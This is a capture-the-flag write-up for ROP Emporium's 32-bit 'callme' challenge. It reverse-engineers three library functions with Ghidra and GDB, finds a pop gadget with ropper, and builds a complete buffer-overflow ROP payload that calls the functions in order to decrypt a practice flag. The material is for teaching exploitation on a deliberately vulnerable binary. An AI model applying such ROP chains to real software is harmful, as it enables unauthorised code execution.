# callme

32bit version of the binary.

The further we go on the challenges, the less I will explain in order not to repeat the same information. Feel free to search anything that isn't clear, I will do my best to always leave good pointers for further research.

## First moves

As usual, we want to check the file and see what we're handling.

`file`

```bash
└─$ file callme32
callme32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3ca5cba17bcd8926f0cda98986ef619c55023b6d, not stripped
```

This challenge also came with its own shared lib

```bash
└─$ file libcallme32.so
libcallme32.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, BuildID[sha1]=816c1579385d969e49df2643528fb7d58e3829af, not stripped
```

`checksec`

```bash
└─$ checksec --file=callme32
[*] '/home/kali/my_challenges/pwn/ropemporium/02-callme/callme32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    RUNPATH:    b'.'
    Stripped:   No
```

with a little manual fuzzing, we can see it's vulnerable to buffer overflows.

## Lay of the land

We will open up Ghidra this time for a little reverse engineering detour.

We got the usual main function, pwnme function that has a buffer overflow problem and will get pwned shortly (lmao) and the usefulFunction. Looking at usefulFunction:

```python
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined usefulFunction()
             undefined         AL:1           <RETURN>
                             usefulFunction                                  XREF[2]:     080488b0, 08048980(*)
        0804874f 55              PUSH       EBP
        08048750 89 e5           MOV        EBP,ESP
        08048752 83 ec 08        SUB        ESP,0x8
        08048755 83 ec 04        SUB        ESP,0x4
        08048758 6a 06           PUSH       0x6
        0804875a 6a 05           PUSH       0x5
        0804875c 6a 04           PUSH       0x4
        0804875e e8 7d fd        CALL       <EXTERNAL>::callme_three                         undefined callme_three()
                 ff ff
        08048763 83 c4 10        ADD        ESP,0x10
        08048766 83 ec 04        SUB        ESP,0x4
        08048769 6a 06           PUSH       0x6
        0804876b 6a 05           PUSH       0x5
        0804876d 6a 04           PUSH       0x4
        0804876f e8 dc fd        CALL       <EXTERNAL>::callme_two                           undefined callme_two()
                 ff ff
        08048774 83 c4 10        ADD        ESP,0x10
        08048777 83 ec 04        SUB        ESP,0x4
        0804877a 6a 06           PUSH       0x6
        0804877c 6a 05           PUSH       0x5
        0804877e 6a 04           PUSH       0x4
        08048780 e8 6b fd        CALL       <EXTERNAL>::callme_one                           undefined callme_one()
                 ff ff
        08048785 83 c4 10        ADD        ESP,0x10
        08048788 83 ec 0c        SUB        ESP,0xc
        0804878b 6a 01           PUSH       0x1
        0804878d e8 7e fd        CALL       <EXTERNAL>::exit                                 void exit(int __status)
                 ff ff
                             -- Flow Override: CALL_RETURN (CALL_TERMINATOR)

```

This function is calling three external functions; callme_three, callme_two and callme_one. It seems to be pushing stuff into the stack as arguments for them too. These functions are probably defined in the shared library binary we examined earlier.

Ghidra decompiled this to the following:

```c
void usefulFunction(void)

{
  callme_three(4,5,6);
  callme_two(4,5,6);
  callme_one(4,5,6);
  exit(1);
}
```

We know from the challenge that we want to make consective calls to imported functions. These must be the functions in question.

We can head over to the Global Offset Table (GOT) and its neighbor the Procedure Linkage Table (PLT) to see those functions there. These tables are basically data structures that will hold the address to these functions in their library address space. The main binary (callme) will use them to control the code execution flow into the correct functions in the said library. Read me [here](https://ir0nstone.gitbook.io/notes/binexp/stack/aslr/plt_and_got).

It's not yet quite clear in what sequence we need to call the functions and what these numbers Ghidra is showing as arguments mean. So we will run the binary in GDB and walk through its execution flow. We are particularly interesting to look into these functions to see what's up with them.

We ran the binary in GDB, set breakpoint in main and checked if the lib is loaded into memory:

```bash
pwndbg> info shared
From        To          Syms Read   Shared Object Library
0xf7fc9000  0xf7fec561  Yes         /lib/ld-linux.so.2
0xf7fbd540  0xf7fbd9eb  Yes (*)     ./libcallme32.so
0xf7d961c0  0xf7f210d5  Yes         /lib/i386-linux-gnu/libc.so.6
(*): Shared library is missing debugging information.
```

Sure enough, it's there. It has the symboles so we can actually disassemble the functions right now.

```bash
pwndbg> disass callme_one
Dump of assembler code for function callme_one:
   0xf7fbd63d <+0>:     push   ebp
   0xf7fbd63e <+1>:     mov    ebp,esp
   0xf7fbd640 <+3>:     push   ebx
   0xf7fbd641 <+4>:     sub    esp,0x14
   0xf7fbd644 <+7>:     call   0xf7fbd540 <__x86.get_pc_thunk.bx>
   0xf7fbd649 <+12>:    add    ebx,0x19b7
   0xf7fbd64f <+18>:    cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0xf7fbd656 <+25>:    jne    0xf7fbd733 <callme_one+246>
   0xf7fbd65c <+31>:    cmp    DWORD PTR [ebp+0xc],0xcafebabe
   0xf7fbd663 <+38>:    jne    0xf7fbd733 <callme_one+246>
   0xf7fbd669 <+44>:    cmp    DWORD PTR [ebp+0x10],0xd00df00d
   0xf7fbd670 <+51>:    jne    0xf7fbd733 <callme_one+246>
   0xf7fbd676 <+57>:    mov    DWORD PTR [ebp-0xc],0x0
   0xf7fbd67d <+64>:    sub    esp,0x8
   0xf7fbd680 <+67>:    lea    eax,[ebx-0x1600]
   0xf7fbd686 <+73>:    push   eax
   0xf7fbd687 <+74>:    lea    eax,[ebx-0x15fe]
   0xf7fbd68d <+80>:    push   eax
   0xf7fbd68e <+81>:    call   0xf7fbd510 <fopen@plt>
   0xf7fbd693 <+86>:    add    esp,0x10
   0xf7fbd696 <+89>:    mov    DWORD PTR [ebp-0xc],eax
   0xf7fbd699 <+92>:    cmp    DWORD PTR [ebp-0xc],0x0
   0xf7fbd69d <+96>:    jne    0xf7fbd6bb <callme_one+126>
   0xf7fbd69f <+98>:    sub    esp,0xc
   0xf7fbd6a2 <+101>:   lea    eax,[ebx-0x15e8]
   0xf7fbd6a8 <+107>:   push   eax
   0xf7fbd6a9 <+108>:   call   0xf7fbd4f0 <puts@plt>
   0xf7fbd6ae <+113>:   add    esp,0x10
   0xf7fbd6b1 <+116>:   sub    esp,0xc
   0xf7fbd6b4 <+119>:   push   0x1
   0xf7fbd6b6 <+121>:   call   0xf7fbd500 <exit@plt>
   0xf7fbd6bb <+126>:   sub    esp,0xc
   0xf7fbd6be <+129>:   push   0x21
   0xf7fbd6c0 <+131>:   call   0xf7fbd4e0 <malloc@plt>
   0xf7fbd6c5 <+136>:   add    esp,0x10
   0xf7fbd6c8 <+139>:   mov    DWORD PTR [ebx+0x30],eax
   0xf7fbd6ce <+145>:   mov    eax,DWORD PTR [ebx+0x30]
   0xf7fbd6d4 <+151>:   test   eax,eax
   0xf7fbd6d6 <+153>:   jne    0xf7fbd6f4 <callme_one+183>
   0xf7fbd6d8 <+155>:   sub    esp,0xc
   0xf7fbd6db <+158>:   lea    eax,[ebx-0x15c6]
   0xf7fbd6e1 <+164>:   push   eax
   0xf7fbd6e2 <+165>:   call   0xf7fbd4f0 <puts@plt>
   0xf7fbd6e7 <+170>:   add    esp,0x10
   0xf7fbd6ea <+173>:   sub    esp,0xc
   0xf7fbd6ed <+176>:   push   0x1
   0xf7fbd6ef <+178>:   call   0xf7fbd500 <exit@plt>
   0xf7fbd6f4 <+183>:   mov    eax,DWORD PTR [ebx+0x30]
   0xf7fbd6fa <+189>:   sub    esp,0x4
   0xf7fbd6fd <+192>:   push   DWORD PTR [ebp-0xc]
   0xf7fbd700 <+195>:   push   0x21
   0xf7fbd702 <+197>:   push   eax
   0xf7fbd703 <+198>:   call   0xf7fbd4c0 <fgets@plt>
   0xf7fbd708 <+203>:   add    esp,0x10
   0xf7fbd70b <+206>:   mov    DWORD PTR [ebx+0x30],eax
   0xf7fbd711 <+212>:   sub    esp,0xc
   0xf7fbd714 <+215>:   push   DWORD PTR [ebp-0xc]
   0xf7fbd717 <+218>:   call   0xf7fbd4d0 <fclose@plt>
   0xf7fbd71c <+223>:   add    esp,0x10
   0xf7fbd71f <+226>:   sub    esp,0xc
   0xf7fbd722 <+229>:   lea    eax,[ebx-0x15ac]
   0xf7fbd728 <+235>:   push   eax
   0xf7fbd729 <+236>:   call   0xf7fbd4f0 <puts@plt>
   0xf7fbd72e <+241>:   add    esp,0x10
   0xf7fbd731 <+244>:   jmp    0xf7fbd74f <callme_one+274>
   0xf7fbd733 <+246>:   sub    esp,0xc
   0xf7fbd736 <+249>:   lea    eax,[ebx-0x158e]
   0xf7fbd73c <+255>:   push   eax
   0xf7fbd73d <+256>:   call   0xf7fbd4f0 <puts@plt>
   0xf7fbd742 <+261>:   add    esp,0x10
   0xf7fbd745 <+264>:   sub    esp,0xc
   0xf7fbd748 <+267>:   push   0x1
   0xf7fbd74a <+269>:   call   0xf7fbd500 <exit@plt>
   0xf7fbd74f <+274>:   nop
   0xf7fbd750 <+275>:   mov    ebx,DWORD PTR [ebp-0x4]
   0xf7fbd753 <+278>:   leave
   0xf7fbd754 <+279>:   ret
End of assembler dump.
```

Interesting, the most noticeable thing is that it has three arguments in the stack that it compares to `0xdeadbeef`, `0xcafebabe`, `0xd00df00d`. This is the correct order for the arguments since they are put in reverse order.

The rest of the function seems to be it opening some file and then using that file descriptor to do some reads and writes on the file before returning. It's also possibly comparing some values. Seems legit.

After disassmebling callme_two and callme_three. I found out they all expect the same exact arguments. I still don't know at this point in what order do I need to call them?

I'm thinking of two ways to find out.

1. I can move the execution flow to one of them and observe what they do, inspect the memory they access to try to determine the call order.
2. Reverse engineer the shared library with Ghidra.

I went with 2.

Here are the three decompiled functions after renaming the variables and studying them

```c
void callme_one(int param_1,int param_2,int param_3)

{
  FILE *fd;

  if (((param_1 != L'\xdeadbeef') || (param_2 != L'\xcafebabe')) || (param_3 != L'\xd00df00d')) {
    puts("Incorrect parameters");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fd = fopen("encrypted_flag.dat","r");
  if (fd == (FILE *)0x0) {
    puts("Failed to open encrypted_flag.dat");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  global_buffer = (char *)malloc(0x21);
  if (global_buffer == (char *)0x0) {
    puts("Could not allocate memory");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  global_buffer = fgets(global_buffer,33,fd);
  fclose(fd);
  puts("callme_one() called correctly");
  return;
}
```

```c
void callme_two(int param_1,int param_2,int param_3)

{
  FILE *fd;
  int char;
  int i;

  if (((param_1 == L'\xdeadbeef') && (param_2 == L'\xcafebabe')) && (param_3 == L'\xd00df00d')) {
    fd = fopen("key1.dat","r");
    if (fd == (FILE *)0x0) {
      puts("Failed to open key1.dat");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    for (i = 0; i < 16; i = i + 1) {
      char = fgetc(fd);
      *(byte *)(i + global_buffer) = (byte)char ^ *(byte *)(i + global_buffer);
    }
    puts("callme_two() called correctly");
    return;
  }
  puts("Incorrect parameters");
                    /* WARNING: Subroutine does not return */
  exit(1);
}

```

```c
void callme_three(int param_1,int param_2,int param_3)

{
  FILE *fd;
  int char;
  int i;

  if (((param_1 == L'\xdeadbeef') && (param_2 == L'\xcafebabe')) && (param_3 == L'\xd00df00d')) {
    fd = fopen("key2.dat","r");
    if (fd == (FILE *)0x0) {
      puts("Failed to open key2.dat");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    for (i = 16; i < 32; i = i + 1) {
      char = fgetc(fd);
      global_buffer[i] = (byte)char ^ global_buffer[i];
    }
    *(uint *)(global_buffer + 4) = *(uint *)(global_buffer + 4) ^ L'\xdeadbeef';
    *(uint *)(global_buffer + 8) = *(uint *)(global_buffer + 8) ^ L'\xdeadbeef';
    *(uint *)(global_buffer + 0xc) = *(uint *)(global_buffer + 0xc) ^ L'\xcafebabe';
    *(uint *)(global_buffer + 0x10) = *(uint *)(global_buffer + 0x10) ^ L'\xcafebabe';
    *(uint *)(global_buffer + 0x14) = *(uint *)(global_buffer + 0x14) ^ L'\xd00df00d';
    *(uint *)(global_buffer + 0x18) = *(uint *)(global_buffer + 0x18) ^ L'\xd00df00d';
    puts(global_buffer);
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Incorrect parameters");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

The library has a global buffer that all the functions have access to. That's `global_buffer`. After studying these, I came to the conculsion:

1. callme_one checks that it was called with the correct arguments and then
   1. opens the encrypted flag file
   2. allocates a 33 bytes long string on the heap and assigns the pointer to the `global_buffer`
   3. reads 33 bytes from the file and stores them in the `global_buffer`
2. callme_two checks that it is called with the correct arguments and then
   1. opens the key1 file
   2. loops through half the `global_buffer` and XOR every char with a char from the key.
3. callme_three checks that it was called with the correct arguments and then
   1. opens key2 file
   2. loops through the other half of the `global_buffer` starting at byte 16 to byte 32. It also XORs each char from the key with a char from the buffer.
   3. Does some sort of XORing with the arguments too. Seems like obsfucation or an extra layer of encryption.

These functions are cooking up some form of a [one-time pad](https://en.wikipedia.org/wiki/One-time_pad). Looking at the code, one can easily guess that the order of execution should be... callme_one, callme_two, callme_three.

We have all we need now.

## Attack plan

1. Find offset to return address.
2. Find addresses of callme\_\*.
3. Write them into the stack in correct order.

## Exploit

### Manual

We're gonna need a gadget that can pop off three values from the stack so we can clean up the stack for each subsequent function call.

This is gonna look like this:

```bash
python2 -c '
print "a"*44 + \
      "callme_one_addr" + \
      "gadget_pop_3" + \
      "arg1" + \
      "arg2" + \
      "arg3" + \
      "callme_two_addr" + \
      "gadget_pop_3" + \
      "arg1" + \
      "arg2" + \
      "arg3" + \
      "callme_three_addr" + \
      "gadget_pop_3" + \
      "arg1" + \
      "arg2" + \
      "arg3" + \
      "optional: exit_addr" \
' > payload
```

`gadget_pop_3` This is at the place where the EBP will normally be. It will execute next after the function finishes and it will pop the args and then return to the next func address since gadgets almost always finish with a `ret`.

Looking for a suitable gadget...

```bash
└─$ ropper --file callme32 --search "pop"
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: callme32
0x080487fb: pop ebp; ret;
0x080487f8: pop ebx; pop esi; pop edi; pop ebp; ret;
0x080484ad: pop ebx; ret;
0x080487fa: pop edi; pop ebp; ret;
0x080487f9: pop esi; pop edi; pop ebp; ret;
0x08048810: pop ss; add byte ptr [eax], al; add esp, 8; pop ebx; ret;
0x080486ea: popal; cld; ret;
```

This one `0x080487f9: pop esi; pop edi; pop ebp; ret;` fits the description quite well.

Now let's see put it all together:

```bash
python2 -c '
print "a"*44 + \
      "\xf0\x84\x04\x08" + \
      "\xf9\x87\x04\x08" + \
      "\xef\xbe\xad\xde" + \
      "\xbe\xba\xfe\xca" + \
      "\x0d\xf0\x0d\xd0" + \
      "\x50\x85\x04\x08" + \
      "\xf9\x87\x04\x08" + \
      "\xef\xbe\xad\xde" + \
      "\xbe\xba\xfe\xca" + \
      "\x0d\xf0\x0d\xd0" + \
      "\xe0\x84\x04\x08" + \
      "\xf9\x87\x04\x08" + \
      "\xef\xbe\xad\xde" + \
      "\xbe\xba\xfe\xca" + \
      "\x0d\xf0\x0d\xd0" + \
      "CCCC" \
' > payload
```

That was a pain to write, thank god for pwntools.
If you're wondering where I got the function addresses from, you can find them in Ghidra in the `.got.plt` section or when you run `info functions` on GDB.

### Pwntools

Check out `exploit.py` and `exploit_rop.py`.
